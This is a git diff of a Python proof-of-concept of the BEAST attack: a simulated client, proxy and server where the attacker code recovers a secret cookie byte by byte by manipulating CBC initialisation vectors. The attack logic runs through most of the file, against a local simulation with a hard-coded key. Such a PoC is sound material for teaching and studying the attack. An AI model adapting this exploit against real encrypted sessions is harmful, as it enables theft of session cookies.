@@ -1,9 +1,14 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+'''
+    BEAST implementation with a client <--> proxy <--> server
+    Author: mpgn <martial.puygrenier@gmail.com>
+'''
+
 import argparse
 import binascii
-import random
+import logging
 import re
 import select
 import socket
@@ -16,35 +21,10 @@ import threading
 import time
 import os
 from utils.view import *
+from utils.AESCipher import *
 from pprint import pprint
 from struct import *
 from itertools import cycle, izip
-from Crypto.Cipher import AES
-from Crypto import Random
-
-BS = 16
-pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
-unpad = lambda s : s[:-ord(s[len(s)-1:])]
-
-class AESCipher:
-    def __init__( self, key ):
-        self.key = key
-        self.iv = Random.new().read( AES.block_size )
-
-    def set_vector_init(self, iv):
-        self.iv = iv
-
-    def encrypt( self, raw ):
-        raw = pad(raw)
-        iv = self.iv
-        cipher = AES.new( self.key, AES.MODE_CBC, iv )
-        return iv + cipher.encrypt( raw )
-
-    def decrypt( self, enc ):
-        iv = enc[:16]
-        cipher = AES.new(self.key, AES.MODE_CBC, iv )
-        return unpad(cipher.decrypt( enc[16:] ))
-
 
 class SecureTCPHandler(SocketServer.BaseRequestHandler):
   def handle(self):
@@ -54,8 +34,6 @@ class SecureTCPHandler(SocketServer.BaseRequestHandler):
             data = self.request.recv(1024)
             if data == '':
                 break
-            # de = cbc.decrypt(data)
-            # print [de[i:i+16] for i in range(0, len(de), 16)]
         except ssl.SSLError as e:
             pass
     return
@@ -89,9 +67,9 @@ class Server:
         return
 
 class Client(AESCipher):
-    """ The unsecure post of the client can be a "unsecure" browser for example.
-    The client generate a random cookie and send it to the server through the proxy
-    The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
+    """ The unsecure post of the client like an "unsecure" browser for example.
+        The client generate a random cookie and send it to the server through the proxy
+        The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
     """
 
     def __init__(self, host, port, cbc):
@@ -100,7 +78,7 @@ class Client(AESCipher):
         self.cbc = cbc
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print draw("Sending request : ", bold=True, fg_yellow=True)
-        print draw("the secret is Gybscdefghicasaa" + "\n\n",  bold=True, fg_yellow=True)
+        print draw("the secret is " + self.cookie +"\n\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
@@ -111,8 +89,11 @@ class Client(AESCipher):
         return
 
     def request_send(self, prefix=0, data=0):
+        '''
+            Default request if no data
+        '''
         if data == 0:
-            data = prefix*"a" + "the secret is Gybscdefghicasaa"
+            data = prefix*"a" + "the secret is " + self.cookie
         try:
             data = self.cbc.encrypt(data)
             self.socket.sendall(data)
@@ -158,12 +139,10 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                     if len(data) == 0:
                         running = False
                     else:
-                        #print "Alter"
                         exploit.set_length_frame(data)
                         exploit.alter()
-                        #print ''
                     
-                    # we send data to the server
+                    # client -> server
                     socket_server.send(data)
         return
 
@@ -191,9 +170,9 @@ class Proxy:
         return
 
 class BEAST(Client, AESCipher):
-    """ Assimilate to the attacker
-    detect the length of a CBC block
-    alter the ethernet frame of the client to decipher a byte regarding the proxy informations
+    """ 
+        Assimilate to the attacker :
+        - alter the request of the client to decipher a byte regarding the proxy informations
     """
 
     def __init__(self, client, cbc):
@@ -201,11 +180,7 @@ class BEAST(Client, AESCipher):
         self.cbc = cbc
         self.length_block = 16
         self.start_exploit = False
-        self.decipherable = False
-        self.request = ''
-        self.byte_decipher = 0
         self.length_frame = 0
-        self.block_decipher = 0
         self.vector_init = ''
         self.previous_cipher = ''
         self.frame = ''
@@ -215,43 +190,54 @@ class BEAST(Client, AESCipher):
         
         secret = []
 
-        #client send + alter
-        test = "the secret is "
-        padding = self.length_block - len(test) - 1
-        test = "a"*padding + test
+        # the part of the request the atacker know
+        i_know = "the secret is "
+
+        # padding is the length we need to add to i_know to create a length of 15 bytes
+        padding = self.length_block - len(i_know) - 1
+        i_know = "a"*padding + i_know
+
+        # add byte will be decrement every byte deciphered
         add_byte = self.length_block
         t = 0
+        # t < 16 because i know the length of the secret is 16 bytes
         while(t < 16):
             for i in range(1,256):
+
                 self.start_exploit = True
                 self.client_connection()
+                # make the client send a request with our paramters
                 self.request_send(add_byte+padding)
+
+                # sleep to be sure that the request is intercepted by the proxy
                 time.sleep(0.05)           
-                #print "frame1"
-                #print split_len(binascii.hexlify(self.frame), 32)
+
+                # get the value of the request ciphered
                 original = split_len(binascii.hexlify(self.frame), 32)
 
                 self.start_exploit = False
-                p_guess = test + chr(i)
+                # create a plaintext block 
+                p_guess = i_know + chr(i)
                 xored = self.xor_block(p_guess, i)
 
+                # send the request with our data
                 self.request_send(add_byte+padding, xored)
+                # sleep to be sure that the request is intercepted by the proxy
                 time.sleep(0.05)
-                #print "frame2"
-                #print split_len(binascii.hexlify(self.frame), 32)
+
                 result = split_len(binascii.hexlify(self.frame), 32)
 
-                ts = getTerminalSize()
-                if ts[0] >= 237:
-                    sys.stdout.write("\r%s ----> %s" % (original[1:], result[1:]))
-                    sys.stdout.flush()
-                else:
-                    sys.stdout.write("\r%s" % (search(i)))
-                    sys.stdout.flush()
+                sys.stdout.write("\r%s" % (search(i)))
+                sys.stdout.flush()
 
+                # if the result request contains the same cipher block of the original request -> OK
                 if result[1] == original[2]:
+
+                    logging.debug("original request ----> result request")
+                    logging.debug("\r%s ----> %s" % (original[1:], result[1:]))
+
                     print " Find char " + chr(i) + " after " + str(i) +" tries"
-                    test = p_guess[1:]
+                    i_know = p_guess[1:]
                     add_byte = add_byte - 1
                     secret.append(chr(i))
                     t = t + 1
@@ -262,20 +248,20 @@ class BEAST(Client, AESCipher):
         self.client_disconect()
         return
 
-    def xor_strings(self, xs, ys, zs):
-        return "".join(chr(ord(x) ^ ord(y) ^ ord(z)) for x, y, z in zip(xs, ys, zs))
-
     def alter(self):
-        #print self.start_exploit
         if self.start_exploit is True:
             self.frame = bytearray(self.frame)
             self.vector_init = str(self.frame[-self.length_block:])
 
+            # set the vector initialitaton to the previous cipher of the previous request
             self.cbc.set_vector_init(self.vector_init)
 
             self.previous_cipher = str(self.frame[self.length_block:self.length_block*2])
             return str(self.frame)
         return self.frame
+
+    def xor_strings(self, xs, ys, zs):
+        return "".join(chr(ord(x) ^ ord(y) ^ ord(z)) for x, y, z in zip(xs, ys, zs))
 
     def xor_block(self,p_guess, i):
         xored = self.xor_strings(self.vector_init, self.previous_cipher, p_guess)
@@ -299,12 +285,16 @@ class BEAST(Client, AESCipher):
 
 if __name__ == '__main__':                           
 
-    parser = argparse.ArgumentParser(description='Connection with SSLv3')
-    parser.add_argument('host', help='hostname or IP address')
+    parser = argparse.ArgumentParser(description='Poc of BEAST attack')
+    parser.add_argument('host', help='hostname or IP address "localhost"')
     parser.add_argument('port', type=int, help='TCP port number')
-    parser.add_argument('-v', help='debug mode', action="store_true")
+    parser.add_argument('-v', "--verbose", help='debug mode, you need a large screen', action="store_true")
     args = parser.parse_args()
 
+    if args.verbose:
+        logging.basicConfig(level=logging.DEBUG)
+
+    # this key is unsecure but we doesn't care for the Poc
     cbc = AESCipher('V38lKILOJmtpQMHp')
     server   = Server(args.host, args.port)
     client   = Client(args.host, args.port+1, cbc)
